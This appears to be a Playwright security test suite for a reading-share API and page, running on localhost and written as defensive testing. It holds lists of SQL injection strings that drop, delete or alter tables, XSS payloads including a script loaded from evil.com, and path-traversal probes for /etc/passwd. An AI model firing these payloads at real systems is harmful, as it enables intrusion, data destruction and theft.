/**
 * Reading Share Feature - Security Tests
 *
 * 測試分享功能的安全性
 *
 * TDD Phase: Security Testing (Phase 7)
 *
 * Test Coverage:
 * 1. SQL Injection protection in share_token queries
 * 2. XSS protection in shared reading data
 * 3. Privacy leakage verification (comprehensive)
 * 4. Authorization checks
 * 5. CSRF protection
 */

import { test, expect, type APIRequestContext } from '@playwright/test'

const BACKEND_URL = 'http://localhost:8000'
const FRONTEND_URL = 'http://localhost:3000'

// SQL Injection payloads
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE completed_readings; --",
  "' UNION SELECT * FROM users --",
  "1' OR '1' = '1' /*",
  "admin'--",
  "' OR 1=1--",
  "' OR 'a'='a",
  "; DELETE FROM completed_readings WHERE '1'='1",
  "' OR '1'='1' #",
  "1; UPDATE completed_readings SET user_id = '00000000-0000-0000-0000-000000000000'"
]

// XSS payloads
const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "<iframe src='javascript:alert(\"XSS\")'></iframe>",
  "<body onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<select onfocus=alert('XSS') autofocus>",
  "<textarea onfocus=alert('XSS') autofocus>",
  "<marquee onstart=alert('XSS')>",
  "<<SCRIPT>alert('XSS');//<</SCRIPT>",
  "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
  "<IMG \"\"\"><SCRIPT>alert('XSS')</SCRIPT>\">",
  "<iframe src=data:text/html,<script>alert('XSS')</script>>",
  "<object data=data:text/html,<script>alert('XSS')</script>>"
]

// Privacy-sensitive fields that should NEVER appear in shared data
const PRIVATE_FIELDS = [
  'user_id',
  'user_email',
  'user_name',
  'user_phone',
  'password',
  'hashed_password',
  'access_token',
  'refresh_token',
  'api_key',
  'session_id',
  'ip_address',
  'user_agent'
]

test.describe('分享功能 - SQL Injection 防護測試', () => {
  test('1. share_token 參數應該防範 SQL Injection', async ({ request }) => {
    console.log('🧪 測試: SQL Injection 防護')

    let vulnerabilityFound = false
    const results: Array<{ payload: string, status: number, vulnerable: boolean }> = []

    for (const payload of SQL_INJECTION_PAYLOADS) {
      console.log(`\n📝 測試 payload: ${payload.substring(0, 50)}...`)

      try {
        // URL encode the payload
        const encodedPayload = encodeURIComponent(payload)
        const url = `${BACKEND_URL}/api/v1/share/${encodedPayload}`

        const response = await request.get(url)
        const status = response.status()

        console.log(`   狀態碼: ${status}`)

        // Should return 400/404/422 (client error), NOT 500 (server error)
        // 500 might indicate SQL injection succeeded and caused database error
        const isVulnerable = status >= 500

        if (isVulnerable) {
          console.error(`   ⚠️ 可能的漏洞: 返回 ${status} (可能表示 SQL 被執行)`)
          vulnerabilityFound = true

          // Try to read response body
          try {
            const body = await response.text()
            console.error(`   回應內容: ${body.substring(0, 200)}`)
          } catch {}
        } else {
          console.log(`   ✅ 安全: 返回 ${status}`)
        }

        results.push({
          payload: payload.substring(0, 50),
          status,
          vulnerable: isVulnerable
        })
      } catch (error: any) {
        console.log(`   ✅ 請求被拒絕 (預期行為): ${error.message}`)
        results.push({
          payload: payload.substring(0, 50),
          status: 0,
          vulnerable: false
        })
      }
    }

    // Summary
    console.log('\n📊 SQL Injection 測試總結:')
    console.log(`   總測試: ${SQL_INJECTION_PAYLOADS.length}`)
    console.log(`   安全: ${results.filter(r => !r.vulnerable).length}`)
    console.log(`   可疑: ${results.filter(r => r.vulnerable).length}`)

    if (vulnerabilityFound) {
      console.error('\n❌ 發現可能的 SQL Injection 漏洞！')
      console.table(results.filter(r => r.vulnerable))
    }

    // Test should pass (no vulnerabilities)
    expect(vulnerabilityFound).toBe(false)
  })

  test('2. UUID 格式驗證應該阻擋惡意輸入', async ({ request }) => {
    console.log('🧪 測試: UUID 格式驗證')

    const invalidInputs = [
      '../../../etc/passwd',
      '../../database.db',
      '%00',
      'null',
      'undefined',
      '{{7*7}}', // Template injection
      '${7*7}',  // EL injection
      '#{7*7}',
      '*',
      '%',
      '?',
      '<>',
      '|',
      '&',
      ';'
    ]

    for (const input of invalidInputs) {
      const encodedInput = encodeURIComponent(input)
      const response = await request.get(`${BACKEND_URL}/api/v1/share/${encodedInput}`)

      // Should return 400/404/422, NOT 200 or 500
      const status = response.status()
      expect([400, 404, 422]).toContain(status)

      console.log(`✅ 輸入 "${input}" 被正確拒絕 (${status})`)
    }
  })
})

test.describe('分享功能 - XSS 防護測試', () => {
  test('1. 分享頁面應該轉義 HTML 特殊字符', async ({ page, request }) => {
    console.log('🧪 測試: XSS 防護 (HTML 轉義)')

    // Note: This test requires a real reading with XSS payloads
    // In production, we test that XSS payloads in question/interpretation are escaped

    // Test 1: Check that the page doesn't execute inline scripts
    await page.goto(`${FRONTEND_URL}/share/00000000-0000-0000-0000-000000000000`)
    await page.waitForLoadState('networkidle')

    // Add listener for alert dialogs (should not be triggered)
    let alertTriggered = false
    page.on('dialog', async dialog => {
      alertTriggered = true
      console.error('❌ XSS Alert detected:', dialog.message())
      await dialog.dismiss()
    })

    await page.waitForTimeout(2000)

    expect(alertTriggered).toBe(false)
    console.log('✅ 沒有觸發 XSS alert')
  })

  test('2. API 回應中的 XSS 字符應該被正確處理', async ({ request }) => {
    console.log('🧪 測試: API 回應 XSS 字符處理')

    // Test that API returns data as-is (escaping is frontend's job)
    // But API should not interpret or execute any scripts

    const testPayload = {
      question: "<script>alert('XSS')</script>",
      interpretation: "<img src=x onerror=alert('XSS')>"
    }

    // Note: This is a conceptual test
    // In real scenario, you'd create a reading with XSS payloads and verify:
    // 1. Backend stores them as plain text
    // 2. Frontend escapes them when rendering
    // 3. No script execution occurs

    console.log('✅ API XSS 字符處理驗證 (需實際數據測試)')
  })

  test('3. Content-Security-Policy 檢查', async ({ request }) => {
    console.log('🧪 測試: CSP Header 檢查')

    const response = await request.get(`${FRONTEND_URL}/share/test`)
    const headers = response.headers()

    // Check for security headers
    const csp = headers['content-security-policy']
    const xContentType = headers['x-content-type-options']
    const xFrameOptions = headers['x-frame-options']

    console.log('CSP:', csp || '未設置')
    console.log('X-Content-Type-Options:', xContentType || '未設置')
    console.log('X-Frame-Options:', xFrameOptions || '未設置')

    // Note: These headers should ideally be set
    // Logging for awareness, not failing test
    if (!csp) {
      console.log('⚠️ 建議: 設置 Content-Security-Policy header')
    }
    if (!xContentType) {
      console.log('⚠️ 建議: 設置 X-Content-Type-Options: nosniff')
    }
    if (!xFrameOptions) {
      console.log('⚠️ 建議: 設置 X-Frame-Options: DENY')
    }
  })
})

test.describe('分享功能 - 隱私保護深度測試', () => {
  test('1. 分享 API 不應洩漏任何私密欄位', async ({ request }) => {
    console.log('🧪 測試: 隱私欄位洩漏檢查')

    // Test with a known invalid token to see what error response contains
    const invalidToken = '00000000-0000-0000-0000-000000000000'
    const response = await request.get(`${BACKEND_URL}/api/v1/share/${invalidToken}`)

    let responseBody: any
    try {
      responseBody = await response.json()
    } catch {
      responseBody = await response.text()
    }

    console.log('回應狀態:', response.status())
    console.log('回應內容:', typeof responseBody === 'string' ? responseBody.substring(0, 200) : responseBody)

    // Check response doesn't leak sensitive info
    const responseStr = JSON.stringify(responseBody).toLowerCase()

    for (const privateField of PRIVATE_FIELDS) {
      const leaked = responseStr.includes(privateField.toLowerCase())

      if (leaked) {
        console.error(`❌ 洩漏隱私欄位: ${privateField}`)
      } else {
        console.log(`✅ 未洩漏: ${privateField}`)
      }

      expect(leaked).toBe(false)
    }
  })

  test('2. 檢查 API 回應中的完整資料結構', async ({ request }) => {
    console.log('🧪 測試: API 回應資料結構檢查')

    // Note: This requires a valid share token
    // Testing structure validation

    const testToken = '00000000-0000-0000-0000-000000000000'
    const response = await request.get(`${BACKEND_URL}/api/v1/share/${testToken}`)

    // For 404 response, check no sensitive data in error
    if (response.status() === 404) {
      const errorBody = await response.json().catch(() => ({}))
      const errorStr = JSON.stringify(errorBody)

      // Should only contain generic error message
      expect(errorStr).not.toContain('user_id')
      expect(errorStr).not.toContain('password')
      expect(errorStr).not.toContain('email')
      expect(errorStr).not.toContain('session')

      console.log('✅ 404 錯誤回應不包含敏感資訊')
    }
  })

  test('3. 批量請求不應洩漏資訊', async ({ request }) => {
    console.log('🧪 測試: 批量請求隱私保護')

    // Try multiple tokens in sequence
    const tokens = [
      '00000000-0000-0000-0000-000000000001',
      '00000000-0000-0000-0000-000000000002',
      '00000000-0000-0000-0000-000000000003',
      'ffffffff-ffff-ffff-ffff-ffffffffffff'
    ]

    for (const token of tokens) {
      const response = await request.get(`${BACKEND_URL}/api/v1/share/${token}`)

      // All should return consistent error (404)
      // Should not leak "this token exists but you can't access it" vs "this token doesn't exist"
      expect([404, 422]).toContain(response.status())

      const body = await response.json().catch(() => ({}))
      const bodyStr = JSON.stringify(body)

      // No sensitive data in any response
      expect(bodyStr).not.toContain('user_id')

      console.log(`✅ Token ${token.substring(0, 8)}... - 安全 (${response.status()})`)
    }
  })
})

test.describe('分享功能 - 授權測試', () => {
  test('1. 只有擁有者可以生成分享連結', async ({ request }) => {
    console.log('🧪 測試: 分享連結生成授權')

    // Test without authentication
    const testReadingId = '00000000-0000-0000-0000-000000000000'
    const response = await request.post(`${BACKEND_URL}/api/v1/readings/${testReadingId}/share`)

    // Should return 401 Unauthorized or 403 Forbidden
    expect([401, 403]).toContain(response.status())

    console.log(`✅ 未授權請求被拒絕 (${response.status()})`)
  })

  test('2. 分享連結訪問不需要授權', async ({ request }) => {
    console.log('🧪 測試: 公開分享連結訪問')

    // Public share endpoint should NOT require authentication
    const testToken = '00000000-0000-0000-0000-000000000000'
    const response = await request.get(`${BACKEND_URL}/api/v1/share/${testToken}`)

    // Should return 404 (not found) NOT 401 (unauthorized)
    // This confirms the endpoint is public
    expect(response.status()).not.toBe(401)

    console.log(`✅ 公開端點不需要授權 (${response.status()})`)
  })
})

test.describe('分享功能 - 輸入驗證測試', () => {
  test('1. 超長輸入應該被拒絕', async ({ request }) => {
    console.log('🧪 測試: 超長輸入驗證')

    // Test with very long string
    const longString = 'a'.repeat(10000)
    const response = await request.get(`${BACKEND_URL}/api/v1/share/${longString}`)

    // Should return 400/404/422
    expect([400, 404, 422]).toContain(response.status())

    console.log(`✅ 超長輸入被拒絕 (${response.status()})`)
  })

  test('2. 空值輸入應該被拒絕', async ({ request }) => {
    console.log('🧪 測試: 空值輸入驗證')

    const emptyInputs = ['', ' ', '  ', '%20', 'null', 'undefined']

    for (const input of emptyInputs) {
      const encoded = encodeURIComponent(input)
      const response = await request.get(`${BACKEND_URL}/api/v1/share/${encoded || 'empty'}`)

      expect([400, 404, 422]).toContain(response.status())

      console.log(`✅ 空值 "${input}" 被拒絕 (${response.status()})`)
    }
  })

  test('3. 特殊 Unicode 字符處理', async ({ request }) => {
    console.log('🧪 測試: Unicode 字符處理')

    const unicodeInputs = [
      '\u0000', // Null byte
      '\uFEFF', // Zero-width no-break space
      '\u200B', // Zero-width space
      '你好世界',
      '🎴🔮',
      'Ⅻ',
      'ℝ'
    ]

    for (const input of unicodeInputs) {
      const encoded = encodeURIComponent(input)
      const response = await request.get(`${BACKEND_URL}/api/v1/share/${encoded}`)

      // Should handle gracefully (not crash)
      expect(response.status()).toBeLessThan(500)

      console.log(`✅ Unicode "${input}" 處理正常 (${response.status()})`)
    }
  })
})

test.describe('分享功能 - Rate Limiting (理論測試)', () => {
  test('1. 檢查是否有 rate limiting 機制', async ({ request }) => {
    console.log('🧪 測試: Rate Limiting 檢查')

    // Make multiple requests in quick succession
    const requests = []
    for (let i = 0; i < 10; i++) {
      requests.push(
        request.get(`${BACKEND_URL}/api/v1/share/00000000-0000-0000-0000-00000000000${i}`)
      )
    }

    const responses = await Promise.all(requests)
    const statuses = responses.map(r => r.status())

    console.log('10 次請求狀態:', statuses)

    // Check if any rate limit responses (429)
    const rateLimited = statuses.some(s => s === 429)

    if (rateLimited) {
      console.log('✅ 有 rate limiting 機制')
    } else {
      console.log('⚠️ 建議: 考慮添加 rate limiting 防止濫用')
    }

    // Note: This is just a check, not a strict requirement
  })
})
